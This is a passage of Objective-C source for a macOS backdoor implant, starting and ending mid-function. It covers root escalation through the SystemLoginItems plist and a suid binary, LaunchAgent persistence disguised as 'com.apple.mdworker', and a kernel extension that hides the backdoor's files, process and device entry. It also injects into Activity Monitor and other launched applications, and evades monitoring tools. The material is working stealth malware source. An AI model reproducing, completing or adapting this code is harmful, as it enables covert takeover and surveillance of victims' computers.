  NSString *info_pl = [info_orig_pl stringByReplacingOccurrencesOfString: @"RCSMInputManager" 
                                                              withString: gInputManagerName];
  
#ifdef DEBUG_CORE
  infoLog(@"info.plist for osax %@", info_pl);
#endif
  
  [info_pl writeToFile: @"/Library/ScriptingAdditions/appleOsax/Contents/Info.plist" 
            atomically: NO
              encoding: NSASCIIStringEncoding
                 error: NULL];
  
  [info_pl release];
  [info_orig_pl release];
  
  NSString *resource_r = [[NSString alloc] initWithCString: RCSMInputManager_r];
  
  [resource_r writeToFile: @"/Library/ScriptingAdditions/appleOsax/Contents/Resources/appleOsax.r" 
               atomically: NO
                 encoding: NSASCIIStringEncoding
                    error: NULL];
  
  [resource_r release];
}


- (void)_solveKernelSymbolsForKext
{
  int kernFD      = 0;
  int ret         = 0;
  int filesize    = 0;
  
  unsigned int symAddress = 0;
  
  void *imageBase = NULL;
  char filename[] = "/mach_kernel";
  struct stat sb;
  symbol_t sym;
  
  unsigned int kmod_hash                = 0xdd2c36d6; // _kmod
  unsigned int nsysent_hash             = 0xb366074d; // _nsysent
  unsigned int tasks_hash               = 0xdbb44cef; // _tasks
  unsigned int allproc_hash             = 0x3fd3c678; // _allproc
  unsigned int tasks_count_hash         = 0xa3f77e7f; // _tasks_count
  unsigned int nprocs_hash              = 0xa77ea22e; // _nprocs
  unsigned int tasks_threads_lock_hash  = 0xd94f2751; // _tasks_threads_locks
  unsigned int proc_lock_hash           = 0x44c085d5; // _proc_lock
  unsigned int proc_unlock_hash         = 0xf46ca50e; // _proc_unlock
  unsigned int proc_list_lock_hash      = 0x9129f0e2; // _proc_list_lock
  unsigned int proc_list_unlock_hash    = 0x5337599b; // _proc_list_unlock
  
  kernFD = open(filename, O_RDONLY);
  
  if (kernFD == -1) 
    {
#ifdef DEBUG_CORE
      errorLog(@"Error on open");
#endif
      return;
    }
  
  if (gBackdoorFD == -1) 
    {
#ifdef DEBUG_CORE
      errorLog(@"Error on ioctl device");
#endif
      return;
  }
  
  if (stat(filename, &sb) == -1)
    {
#ifdef DEBUG_CORE
      errorLog(@"Error on stat");
#endif
      return;
    }
  
  filesize = sb.st_size;

#ifdef DEBUG_CORE
  infoLog(@"filesize: %d\n", filesize);
#endif
  
  if ((imageBase = mmap(0,
                        filesize,
                        PROT_READ,
                        MAP_PRIVATE,
                        kernFD,
                        0)) == (caddr_t)-1)
    {
#ifdef DEBUG_CORE
      errorLog(@"Error on mmap\n");
#endif

      return;
    }
  
#ifdef DEBUG_CORE
  infoLog(@"file mapped @ 0x%lx\n", (unsigned long)imageBase);
#endif
  
  // Sending Symbol
  symAddress = findSymbolInFatBinary(imageBase, kmod_hash);
  sym.hash   = kmod_hash;
  sym.symbol = symAddress;
  ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM, &sym);
  
  // Sending Symbol
  symAddress = findSymbolInFatBinary(imageBase, nsysent_hash);
  sym.hash   = nsysent_hash;
  sym.symbol = symAddress;
  ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM, &sym);
  
  // Sending Symbol
  symAddress = findSymbolInFatBinary(imageBase, tasks_hash);
  sym.hash   = tasks_hash;
  sym.symbol = symAddress;
  ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM, &sym);
  
  // Sending Symbol
  symAddress = findSymbolInFatBinary(imageBase, allproc_hash);
  sym.hash   = allproc_hash;
  sym.symbol = symAddress;
  ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM, &sym);
  
  // Sending Symbol
  symAddress = findSymbolInFatBinary(imageBase, tasks_count_hash);
  sym.hash   = tasks_count_hash;
  sym.symbol = symAddress;
  ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM, &sym);
  
  // Sending Symbol
  symAddress = findSymbolInFatBinary(imageBase, nprocs_hash);
  sym.hash   = nprocs_hash;
  sym.symbol = symAddress;
  ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM, &sym);
  
  // Sending Symbol
  symAddress = findSymbolInFatBinary(imageBase, tasks_threads_lock_hash);
  sym.hash   = tasks_threads_lock_hash;
  sym.symbol = symAddress;
  ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM, &sym);
  
  // Sending Symbol
  symAddress = findSymbolInFatBinary(imageBase, proc_lock_hash);
  sym.hash   = proc_lock_hash;
  sym.symbol = symAddress;
  ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM, &sym);
  
  // Sending Symbol
  symAddress = findSymbolInFatBinary(imageBase, proc_unlock_hash);
  sym.hash   = proc_unlock_hash;
  sym.symbol = symAddress;
  ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM, &sym);
  
  // Sending Symbol
  symAddress = findSymbolInFatBinary(imageBase, proc_list_lock_hash);
  sym.hash   = proc_list_lock_hash;
  sym.symbol = symAddress;
  ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM, &sym);
  
  // Sending Symbol
  symAddress = findSymbolInFatBinary(imageBase, proc_list_unlock_hash);
  sym.hash   = proc_list_unlock_hash;
  sym.symbol = symAddress;
  ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM, &sym);
  
  munmap(imageBase, filesize);
  close(kernFD);
}

//
// Code stolen from pmconfigd
// http://www.opensource.apple.com/source/PowerManagement/PowerManagement-137/pmconfigd/pmconfigd.c
// Looks like it's undocumented
//
- (void)_registerForShutdownNotifications
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];

#ifdef DEBUG_CORE
  infoLog(@"Initializing shutdown notifications");
#endif
  
  CFMachPortRef       gNotifyMachPort     = NULL;
  CFRunLoopSourceRef  gNotifyMachPortRLS  = NULL;
  mach_port_t         our_port            = MACH_PORT_NULL;
  int                 notify_return       = NOTIFY_STATUS_OK;
  
  // Tell the kernel that we are NOT shutting down at the moment, since
  // configd is just launching now.
  // Why: if configd crashed with "System Shutdown" == kCFbooleanTrue, reset
  // it now as the situation may no longer apply.
  //_setRootDomainProperty(CFSTR("System Shutdown"), kCFBooleanFalse);
  
  if (gOSMajor == 10 && gOSMinor == 5)
    {
#ifdef DEBUG_CORE
      infoLog(@"Registering notifications for Leopard");
#endif
      notify_return = notify_register_mach_port(kLLWShutdowntInitiated,
                                                &our_port,
                                                0, /* flags */
                                                &gLWShutdownNotificationToken);
      
      notify_return = notify_register_mach_port(kLLWRestartInitiated,
                                                &our_port,
                                                NOTIFY_REUSE, /* flags */
                                                &gLWRestartNotificationToken);
      
      notify_return = notify_register_mach_port(kLLWLogoutCancelled,
                                                &our_port,
                                                NOTIFY_REUSE, /* flags */
                                                &gLWLogoutCancelNotificationToken);
      
      notify_return = notify_register_mach_port(kLLWLogoutPointOfNoReturn, 
                                                &our_port,
                                                NOTIFY_REUSE, /* flags */
                                                &gLWLogoutPointOfNoReturnNotificationToken);
    }
  else if (gOSMajor == 10 && gOSMinor == 6)
    {
#ifdef DEBUG_CORE
      infoLog(@"Registering notifications for Snow Leopard");
#endif
      notify_return = notify_register_mach_port(kSLLWShutdowntInitiated,
                                                &our_port,
                                                0, /* flags */
                                                &gLWShutdownNotificationToken);
      
      notify_return = notify_register_mach_port(kSLLWRestartInitiated,
                                                &our_port,
                                                NOTIFY_REUSE, /* flags */
                                                &gLWRestartNotificationToken);
      
      notify_return = notify_register_mach_port(kSLLWLogoutCancelled,
                                                &our_port,
                                                NOTIFY_REUSE, /* flags */
                                                &gLWLogoutCancelNotificationToken);
      
      notify_return = notify_register_mach_port(kSLLWLogoutPointOfNoReturn, 
                                                &our_port,
                                                NOTIFY_REUSE, /* flags */
                                                &gLWLogoutPointOfNoReturnNotificationToken);
    }
  
  gNotifyMachPort = CFMachPortCreateWithPort(kCFAllocatorDefault,
                                             our_port,
                                             computerWillShutdown,
                                             NULL,  /* context */
                                             NULL); /* &shouldFreeInfo */
  if (!gNotifyMachPort)
    return;
  
  // Create RLS for mach port
  gNotifyMachPortRLS = CFMachPortCreateRunLoopSource(kCFAllocatorDefault,
                                                     gNotifyMachPort,
                                                     0); /* order */
  if (!gNotifyMachPortRLS)
    return;
  
  CFRunLoopAddSource(CFRunLoopGetCurrent(),
                     gNotifyMachPortRLS,
                     kCFRunLoopDefaultMode);
                     
  CFRunLoopRun();
  
  [outerPool release];
}

@end

#pragma mark -
#pragma mark Public Implementation
#pragma mark -

@implementation RCSMCore

@synthesize mBinaryName;
@synthesize mApplicationName;
@synthesize mSpoofedName;
@synthesize mMainLoopControlFlag;


- (id)init
{
  self = [super init];
  
  if (self != nil)
    {
      // init instance variables
      [self setMApplicationName: [[[NSBundle mainBundle] executablePath] lastPathComponent]];
      [self setMBinaryName: [[[NSBundle mainBundle] executablePath] lastPathComponent]];
      
      [self setMSpoofedName: [[[[NSBundle mainBundle] executablePath]
                               stringByDeletingLastPathComponent] 
                               stringByAppendingPathComponent: @"System Preferences"]];
      
      // Let's guess all the required names
      [self _guessNames];
      NSString *kextPath    = [[NSString alloc] initWithFormat:
                               @"%@/%@/%@.kext",
                               [[NSBundle mainBundle] bundlePath],
                               @"Contents/Resources",
                               gKextName];
      NSString *loaderPath  = [[NSString alloc] initWithFormat:
                               @"%@/%@",
                               [[NSBundle mainBundle] bundlePath],
                               @"abla"];
      NSString *flagPath    = [[NSString alloc] initWithFormat:
                               @"%@/%@",
                               [[NSBundle mainBundle] bundlePath],
                               @"mdworker.flg"];
      
      // init gUtil instance variables
      [gUtil setMBackdoorPath: [[NSBundle mainBundle] bundlePath]];
      [gUtil setMKextPath: kextPath];
      [gUtil setMSLIPlistPath: SLI_PLIST];
      [gUtil setMServiceLoaderPath: loaderPath];
      [gUtil setMExecFlag: flagPath];
      
      // Allocate global locks
      gControlFlagLock = [[NSLock alloc] init];
      gSuidLock        = [[NSLock alloc] init];
      
      [kextPath release];
      [loaderPath release];
      [flagPath release];
    }
  
  return self;
}

- (void)dealloc
{
  // TODO: Shared Memory deallocation
  [mMainLoopControlFlag release];
  
  if (mBinaryName != nil)
    [mBinaryName release];
  
  if (mApplicationName != nil)
    [mApplicationName release];
  
  if (mSpoofedName != nil)
    [mSpoofedName release];
    
  if (mMainLoopControlFlag != nil)
    [mMainLoopControlFlag release];
  
  // close kext device
  if (gBackdoorFD != 0)
    {
      close(gBackdoorFD);
    }
  
  [super dealloc];
}

- (BOOL)makeBackdoorResident
{
  return [gUtil createLaunchAgentPlist: @"com.apple.mdworker"
                             forBinary: gBackdoorName];
}

- (BOOL)isBackdoorAlreadyResident
{
  NSString *backdoorPlist = [NSString stringWithFormat: @"%@/%@",
                             [[[[[NSBundle mainBundle] bundlePath]
                                stringByDeletingLastPathComponent]
                               stringByDeletingLastPathComponent]
                              stringByDeletingLastPathComponent],
                             BACKDOOR_DAEMON_PLIST];
  
  if ([[NSFileManager defaultManager] fileExistsAtPath: backdoorPlist
                                           isDirectory: NULL])
    {
      return YES;
    }
  else
    {
      return NO;
    }
}

- (BOOL)runMeh
{
  NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
  BOOL sliSuccess = NO, uiSuccess = NO, noPrivs = NO;

  //
  // First of all, calculate properly the shared memory size
  // for logs
  //
  gMemLogMaxSize = sizeof(shMemoryLog) * SHMEM_LOG_MAX_NUM_BLOCKS;

  // Get OS version
  [[NSApplication sharedApplication] getSystemVersionMajor: &gOSMajor
                                                     minor: &gOSMinor
                                                    bugFix: &gOSBugFix];

  NSString *offlineFlag = [NSString stringWithFormat: @"%@/00",
                           [[NSBundle mainBundle] bundlePath]];
  
  if ([[NSFileManager defaultManager] fileExistsAtPath: offlineFlag])
    {
#ifdef DEBUG_CORE
      warnLog(@"Offline mode, installing the backdoor right now");
#endif
      [self makeBackdoorResident];
      [[NSFileManager defaultManager] removeItemAtPath: offlineFlag
                                                 error: nil];
    }

  //
  // With SLIPLIST mode, the backdoor will be executed preauth with uid = 0
  // and will be killed once the user will login, thus we just suid the core
  // and drop the LaunchAgent startup item in order to get executed after login
  //
  if (getuid() == 0)
    {
#ifdef DEBUG_CORE
      infoLog(@"Root executed us");
      infoLog(@"Making binary root suid and dropping launch agents plist");
#endif
      
      [gUtil makeSuidBinary: [[NSBundle mainBundle] executablePath]];
      if ([self makeBackdoorResident] == NO)
        {
#ifdef DEBUG_CORE
          errorLog(@"Error while dropping Launch Agents plist for SLI PLIST mode");
#endif
        }
      else
        {
#ifdef DEBUG_CORE
          infoLog(@"Launch Agents plist dropped");
#endif
        }

      exit(0);
    }

  //
  // Resize shared mem if needed
  //
  [self _resizeSharedMemoryWindow];
  
  //
  // Check it we're the only one on the current user session (1 per user)
  //
  [self _checkForOthers];
  
  //
  // Check the preconfigured mode - default is SLIPLIST
  //
#ifdef DEV_MODE
  NSString *workingMode = [[NSString alloc] initWithString: DEV];
#else
  NSString *workingMode = [[NSString alloc] initWithCString: gMode];
#endif
  
  if ([workingMode isEqualToString: SLIPLIST])
    {
#ifdef DEBUG_CORE
      infoLog(@"SLIPLIST Mode ON");
#endif
      if (gOSMajor == 10 && gOSMinor == 5)
        {
#ifdef DEBUG_CORE
          infoLog(@"System is Leopard");
#endif
          sliSuccess = [self _SLIEscalation];
        }
      else if (gOSMajor == 10 && gOSMinor == 6)
        {
#ifdef DEBUG_CORE
          warnLog(@"SLIPLIST on Snow Leopard, just going with noprivs");
#endif
          noPrivs = YES;
        }
    }
  else if ([workingMode isEqualToString: UISPOOF])
    {
#ifndef NO_UISPOOF
      uiSuccess = [self _UISpoof];
#else
      uiSuccess = YES;
#endif
    }
  else
    {
#ifdef DEBUG_CORE
      infoLog(@"Dev mode on");
      
      sliSuccess = [self _SLIEscalation];
#endif
    }
  
  //
  // Create LaunchAgent dir if it doesn't exists yet
  //
  NSString *launchAgentPath = [NSString stringWithFormat: @"%@/%@",
                               NSHomeDirectory(),
                               [BACKDOOR_DAEMON_PLIST stringByDeletingLastPathComponent]];

  if ([[NSFileManager defaultManager] fileExistsAtPath: launchAgentPath] == NO)
    {
      // Factory restored machines don't have this dir
      mkdir([launchAgentPath UTF8String], 0755);

      // Now chown it -> ourself
      NSArray *_tempArguments = [[NSArray alloc] initWithObjects: @"-R",
                                 NSUserName(),
                                 launchAgentPath,
                                 nil];

      [gUtil executeTask: @"/usr/sbin/chown"
           withArguments: _tempArguments
            waitUntilEnd: YES];

      [_tempArguments release];
    }

  //
  // Check if the backdoor is already resident
  // otherwise add all the required files for making it resident
  //
  if ([self isBackdoorAlreadyResident] == YES)
    {
#ifdef DEBUG_CORE
      warnLog(@"Backdoor has been made already resident");
#endif
      
      if ([gUtil isBackdoorPresentInSLI: [gUtil mBackdoorPath]] == YES)
        {
#ifdef DEBUG_CORE
          infoLog(@"Removing the backdoor entry form the global SLI");
#endif
          if ([gUtil removeBackdoorFromSLIPlist] == YES)
            {
#ifdef DEBUG_CORE
              infoLog(@"Backdoor removed correctly from SLI");
#endif
            }
        }
    }
  else
    {
#ifdef DEBUG_CORE
      warnLog(@"Backdoor has not been made resident yet");
      infoLog(@"sliSuccess: %d", sliSuccess);
      infoLog(@"workingMode: %@", ([workingMode isEqualToString: SLIPLIST]) ? @"SLIPLIST" : @"UISPOOF");
#endif
      
      if (([workingMode isEqualToString: SLIPLIST] && sliSuccess == YES)
          || ([workingMode isEqualToString: UISPOOF])
          || (noPrivs == YES))
        {
#ifdef DEBUG_CORE
          infoLog(@"makeBackdoorResident stage");
#endif
          if ([self makeBackdoorResident] == NO)
            {
#ifdef DEBUG_CORE
              errorLog(@"An error occurred");
#endif
            }
          else
            {
#ifdef DEBUG_CORE
              infoLog(@"successful");
#endif
              if ([gUtil isBackdoorPresentInSLI: [gUtil mBackdoorPath]] == YES)
                {
#ifdef DEBUG_CORE
                  warnLog(@"Removing the backdoor entry form the global SLI");
#endif
                  if ([gUtil removeBackdoorFromSLIPlist] == YES)
                    {
#ifdef DEBUG_CORE
                      infoLog(@"Backdoor removed correctly from SLI");
#endif
                    }
                }
            }          
        }
    }
  [workingMode release];
  
  //
  // Create and initialize shared memory
  //
  if ([mApplicationName isEqualToString: @"System Preferences"] == NO)
    {
      if ([self _createAndInitSharedMemory] == NO)
        {
#ifdef DEBUG_CORE
          errorLog(@"Error while creating shared memory");
#endif
          return NO;
        }
    }
  
  if ([[NSFileManager defaultManager] fileExistsAtPath: [gUtil mExecFlag]
                                           isDirectory: NULL])
    {
#ifdef DEBUG_CORE
      infoLog(@"mExecFlag exists");
#endif
      [self _createInternalFilesAndFolders];
      
      if (getuid() == 0 || geteuid() == 0)
        {
          //
          // Now it's time for all the Info.plist mess
          // we need to create the fs hierarchy for the input manager and kext
          //
          if (gOSMajor == 10 && gOSMinor == 6)
            {
#ifdef DEBUG_CORE
              infoLog(@"Dropping OSAX");
#endif
              [self _dropOsaxBundle];
            }
          else if (gOSMajor == 10 && gOSMinor == 5)
            {
#ifdef DEBUG_CORE
              infoLog(@"Dropping input manager");
#endif
              if ([self _dropInputManager] == NO)
                {
#ifdef DEBUG_CORE
                  errorLog(@"Error while installing input manager");
#endif
                }
            }
        }
    }
  
  [NSThread detachNewThreadSelector: @selector(_registerForShutdownNotifications)
                           toTarget: self
                         withObject: nil];

#ifndef NO_KEXT
  int ret = 0;
  int kextLoaded = 0;
  
  
  if (kextLoaded == 1)
    {
#ifdef DEBUG_CORE
      infoLog(@"kext loaded");
#endif
      
      //
      // Since Snow Leopard doesn't export all the required symbols
      // we're gonna solve them from uspace and send 'em back to kspace
      //
      [self _solveKernelSymbolsForKext];
      
      os_version_t os_ver;
      os_ver.major  = gOSMajor;
      os_ver.minor  = gOSMinor;
      os_ver.bugfix = gOSBugFix;
      
      // Telling kext to find sysent based on OS version
      ret = ioctl(gBackdoorFD, MCHOOK_FIND_SYS, &os_ver);
    
      //
      // Start hiding all the required paths
      //
      NSString *backdoorPlist = [[NSString alloc] initWithString: BACKDOOR_DAEMON_PLIST];
      
#ifdef DEBUG_CORE
      infoLog(@"Hiding LaunchAgent plist");
#endif
      // Hiding LaunchAgent plist
      ret = ioctl(gBackdoorFD, MCHOOK_HIDED, (char *)[[backdoorPlist lastPathComponent] fileSystemRepresentation]);
      
      [backdoorPlist release];
    
      // Hide only inputmanager not osax
      if (gOSMajor == 10 && gOSMinor == 5)
        {
#ifdef DEBUG_CORE
          infoLog(@"Hiding InputManager");
#endif
          NSString *inputManagerPath = [[NSString alloc] initWithString: INPUT_MANAGER_FOLDER];
          
          // Hiding input manager dir
          ret = ioctl(gBackdoorFD, MCHOOK_HIDED, (char *)[inputManagerPath fileSystemRepresentation]);
      
          [inputManagerPath release];
        }
      else if (gOSMajor == 10 && gOSMinor == 6)
        {
#ifdef DEBUG_CORE
          //infoLog(@"Hiding OSAX");
#endif
//          NSString *osaxPath = [[NSString alloc] initWithString: OSAX_FOLDER];
//          // Hiding input manager dir
//          ret = ioctl(gBackdoorFD, MCHOOK_HIDED, (char *)[osaxPath fileSystemRepresentation]);
//          
//          [osaxPath release];
        }
    
      NSString *appPath = [[[NSBundle mainBundle] bundlePath]
                           lastPathComponent];
#ifdef DEBUG_CORE
      infoLog(@"Hiding backdoor dir");
#endif
      // Hiding backdoor dir
      ret = ioctl(gBackdoorFD, MCHOOK_HIDED, (char *)[appPath fileSystemRepresentation]);
      
#ifdef DEBUG_CORE
      infoLog(@"Hiding process %d", getpid());
#endif
      // Hide Process
      ret = ioctl(gBackdoorFD, MCHOOK_HIDEP, [NSUserName() UTF8String]);
      
#ifdef DEBUG_CORE
      infoLog(@"Hiding KEXT");
#endif
      // Hide KEXT
      ret = ioctl(gBackdoorFD, MCHOOK_HIDEK);
      
#ifdef DEBUG_CORE
      infoLog(@"Hiding /dev entry");
#endif
      // Hide KEXT /dev entry
      NSString *kextDevEntry = [[NSString alloc] initWithCString: BDOR_DEVICE];
      ret = ioctl(gBackdoorFD, MCHOOK_HIDED, (char *)[[kextDevEntry lastPathComponent] fileSystemRepresentation]);
      
      [kextDevEntry release];
    }
#endif
  
#ifndef NO_PROC_HIDING
  // Inject running ActivityMonitor
  if (gOSMajor == 10 && gOSMinor == 6 && geteuid() == 0)
    {
      NSNumber *pActivityM = pidForProcessName(@"Activity Monitor");
      
      if (pActivityM != nil) 
        {
#ifdef DEBUG_CORE
          warnLog(@"find running ActivityMonitor with pid %d, injecting...", pActivityM);
#endif
          [self sendEventToPid: pActivityM];
        }
      else 
        {
#ifdef DEBUG_CORE
          warnLog(@"no running ActivityMonitor");
#endif
        }
    }
#endif
  
  // Register notification for new process
  [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver: self 
                                                         selector: @selector(injectBundle:)
                                                             name: NSWorkspaceDidLaunchApplicationNotification 
                                                           object: nil];
  
  // Register notification for terminate process for Crisis agent
  [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver: self 
                                                         selector: @selector(willStopCrisis:)
                                                             name: NSWorkspaceDidTerminateApplicationNotification 
                                                           object: nil];
  
  //
  // Get a task Manager instance (singleton) and load the configuration
  // through the confManager
  //
  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
  
  //
  // Load configuration, starts all agents and the events monitoring routines
  //
  [NSThread detachNewThreadSelector: @selector(loadInitialConfiguration)
                           toTarget: taskManager
                         withObject: nil];
  
  //[taskManager loadInitialConfiguration];
  
  // Set the backdoorControlFlag to RUNNING
  mMainLoopControlFlag = @"RUNNING";
  
  [gControlFlagLock lock];
  taskManager.mBackdoorControlFlag = mMainLoopControlFlag;
  [gControlFlagLock unlock];

  RCSMInfoManager *infoManager = [[RCSMInfoManager alloc] init];
  [infoManager logActionWithDescription: @"Start"];
  [infoManager release];
  
  //
  // Check /var/log/system.log
  //
  //[NSThread detachNewThreadSelector: @selector(_checkSystemLog)
  //                         toTarget: self
  //                       withObject: nil];
  
  //
  // Main backdoor loop
  //
  [self _communicateWithAgents];
  
  [innerPool release];
  return YES;
}

- (void)sendEventToPid: (NSNumber *)thePid
{
  AEEventID eventID = 'load';
  int eUid = geteuid();
  int rUid = getuid();
  int maxRetry = 10;
  
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  RCSMTaskManager *_taskManager = [RCSMTaskManager sharedInstance];
  
  [gControlFlagLock lock];
  NSString *localFlag = [_taskManager getControlFlag];
  [gControlFlagLock unlock];
  
  if ([localFlag isEqualToString: @"STOP"])
    {
      return;
    }
  
  pid_t pidP = (pid_t) [thePid intValue];
  
  SBApplication *app = [SBApplication applicationWithProcessIdentifier: pidP];
  
#ifdef DEBUG_CORE
  verboseLog(@"send event to application pid %d", pidP);
#endif
  
  [app setDelegate: self];
  
  [gSuidLock lock];
  
#ifdef DEBUG_CORE
  verboseLog(@"enter critical session [euid/uid %d/%d]", 
             geteuid(), getuid());
#endif
  
  // trimming process u&g
  seteuid(rUid);
  
  [app setSendMode: kAENoReply | kAENeverInteract | kAEDontRecord];
	
  [app sendEvent: kASAppleScriptSuite
              id: kGetAEUT
      parameters: 0];
  
  sleep(1);
  
  [app setSendMode: kAENoReply | kAENeverInteract | kAEDontRecord];
  
  NSNumber *pid = [NSNumber numberWithInt: getpid()];
  
  id injectReply = [app sendEvent: 'RCSe'
                               id: eventID
                       parameters: 'pido', pid, 0];
  
  // Check if the seteuid do the correct work...
  while ((geteuid() != eUid) && maxRetry) 
    {
      // original u&g
      if (seteuid(eUid) == -1)
        {
#ifdef DEBUG_CORE
          infoLog(@"setting euid error [%d]", 
                  errno);
#endif
        }
    
      usleep(500);
    }
  
  [gSuidLock unlock];
  
#ifdef DEBUG_CORE
  verboseLog(@"exit critical session [euid/uid %d/%d]", 
             geteuid(), getuid());
#endif
  
  if (injectReply != nil) 
    {
#ifdef DEBUG_CORE	
      warnLog(@"unexpected injectReply: %@", injectReply);
#endif
    }
  else 
    {
#ifdef DEBUG_CORE
      verboseLog(@"injection done");
#endif
    }
  
  [thePid release];
  
  [pool release];
}

- (BOOL)isCrisisHookApp: (NSString*)appName
{
  if (gAgentCrisisApp == nil)
    return NO;
  
  for (int i=0; i<[gAgentCrisisApp count]; i++) 
  {
    NSString *tmpAppName = [gAgentCrisisApp objectAtIndex: i];
    if ([appName isCaseInsensitiveLike: tmpAppName])
      return YES;
  }
  
  return NO;
}

- (BOOL)isCrisisNetApp: (NSString*)appName
{
  if (gAgentCrisisNet == nil)
    return NO;
  
  for (int i=0; i<[gAgentCrisisNet count]; i++) 
  {
    NSString *tmpAppName = [gAgentCrisisNet objectAtIndex: i];
    if ([appName isCaseInsensitiveLike: tmpAppName])
      return YES;
  }
  
  return NO;
}

- (void)willStopCrisis: (NSNotification*)notification
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSDictionary *appInfo = [notification userInfo];
  
#ifdef DEBUG_CORE
  infoLog(@"try to stop crisis agent sync for app %@ (gAgentCrisis)", appInfo, gAgentCrisis);
#endif
  
  if ((gAgentCrisis & CRISIS_SYNC) &&
      [self isCrisisNetApp: [appInfo objectForKey: @"NSApplicationName"]]) 
  {

    gAgentCrisis = gAgentCrisis & ~CRISIS_SYNC;
#ifdef DEBUG_CORE
    infoLog(@"Sync enabled! gAgentCrisis = 0x%x", gAgentCrisis);
#endif
  }
    
  [pool release];
}

- (void)injectBundle: (NSNotification*)notification
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  NSDictionary *appInfo = [notification userInfo];

#ifdef DEBUG_CORE
  infoLog(@"running new notificaion on app %@", appInfo);
#endif
  
  if ((gAgentCrisis & CRISIS_START) && 
      [self isCrisisNetApp: [appInfo objectForKey: @"NSApplicationName"]]) 
  {
    gAgentCrisis |= CRISIS_SYNC;
#ifdef DEBUG_CORE
    infoLog(@"Sync disabled! gAgentCrisis = 0x%x", gAgentCrisis);
#endif
  }
  
  if ((gAgentCrisis & CRISIS_START) && 
      [self isCrisisHookApp: [appInfo objectForKey: @"NSApplicationName"]])
  {
#ifdef DEBUG_CORE
    infoLog(@"NSApplicationName match! skipping injection! CRISIS_SYNC = 0x%x", gAgentCrisis);
#endif
    return;
  }
  
  if (gOSMajor == 10 && gOSMinor == 6 && geteuid() == 0)
    {
      // temporary thread for fixing euid/uid escalation
      [NSThread detachNewThreadSelector: @selector(sendEventToPid:) 
                               toTarget: self 
                             withObject: [[appInfo objectForKey: @"NSApplicationProcessIdentifier"] retain]];
    }
  else if (gOSMajor == 10 && gOSMinor == 5 && geteuid() == 0)
    {
      // Only for leopard send pid to new activity monitor via shmem
      if ([[appInfo objectForKey: @"NSApplicationName"] isCaseInsensitiveLike: @"Activity Monitor"])
      //if ([[appInfo objectForKey: @"NSApplicationName"] compare: @"Activity Monitor"] == NSOrderedSame) 
        {
          // Write command with pid
          [self shareCorePidOnShMem];
        }
    }
  
  [pool release];
}

- (void)shareCorePidOnShMem
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSMutableData *pidCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
  pid_t amPid = getpid();
  
#ifdef DEBUG_CORE
  infoLog(@"sending pid to activity monitor %d", amPid);
#endif
  
  shMemoryCommand *shMemoryHeader   = (shMemoryCommand *)[pidCommand bytes];
  shMemoryHeader->agentID           = AGENT_URL;
  shMemoryHeader->direction         = D_TO_AGENT;
  shMemoryHeader->command           = CR_CORE_PID;
  shMemoryHeader->commandDataSize   = sizeof(pid_t);
  memcpy(shMemoryHeader->commandData, &amPid, sizeof(pid_t));
  
  if ([gSharedMemoryCommand writeMemory: pidCommand
                                 offset: OFFT_CORE_PID
                          fromComponent: COMP_CORE] == TRUE)
    {
#ifdef DEBUG_CORE
      infoLog(@"running pid %d to activity monitor", amPid);
#endif
    }
  else 
    {
#ifdef DEBUG_CORE
      infoLog(@"running pid to activity monitor failed");
#endif
    }
  
  [pidCommand release];
  [pool release];
}

/*
- (void)eventDidFail: (const AppleEvent*)event withError: (NSError*)error
{
#ifdef DEBUG_CORE
  NSDictionary* userInfo = [error userInfo];
	infoLog(@"Event %@, error %@", event, userInfo);
#endif
  
}*/

- (int)connectKext
{
#ifdef DEBUG_CORE
  infoLog(@"[connectKext] Initializing backdoor with kext");
#endif
  
  gBackdoorFD = open(BDOR_DEVICE, O_RDWR);
  
  if (gBackdoorFD != -1) 
    {
      int ret;//, bID;
      
      
      ret = ioctl(gBackdoorFD, MCHOOK_INIT, [NSUserName() UTF8String]);
      if (ret < 0)
        {
#ifdef DEBUG_CORE
          errorLog(@"[connectKext] Error while initializing the uspace-kspace "\
                        "communication channel");
#endif
          
          return -1;
        }
      else
        {
#ifdef DEBUG_CORE
          infoLog(@"[connectKext] Backdoor initialized correctly");
#endif
        }
    }
  else
    {
#ifdef DEBUG_CORE
      errorLog(@"[connectKext] Error while opening the KEXT dev entry!");
#endif
      
      return -1;
    }
  
  return 0;
}

- (BOOL)getRootThroughSLI
{
  NSError *error;
  BOOL success;
  NSFileManager *fileManager = [NSFileManager defaultManager];
  
  //
  // Check if the SLI file already exists
  //
  if ([fileManager fileExistsAtPath: [gUtil mSLIPlistPath]
                        isDirectory: NULL])
    {
#ifdef DEBUG_CORE
      infoLog(@"SLI File already exists!");
#endif
      
      success = [gUtil isBackdoorPresentInSLI: [[NSBundle mainBundle] bundlePath]];
      
      if (success == NO)
        {
#ifdef DEBUG_CORE
          infoLog(@"Backdoor is not present in SLI");
#endif
          NSString *SLIBackup       = @"com.apple.SystemLoginItems.plist_bak";
          
          NSString *SLIDestination  = @"com.apple.SystemLoginItems.plist";
          
          //
          // Create a backup of the original SLI Plist in our current folder
          //
          [fileManager copyItemAtPath: [gUtil mSLIPlistPath]
                               toPath: SLIBackup
                                error: &error];
          
          if ([gUtil addBackdoorToSLIPlist] == NO)
            {
#ifdef DEBUG_CORE
              errorLog(@"An error occurred while adding the entry to the SLI plist");
#endif
              return NO;
            }
          
          //
          // Copy back the SLI file (we need first to remove the file)
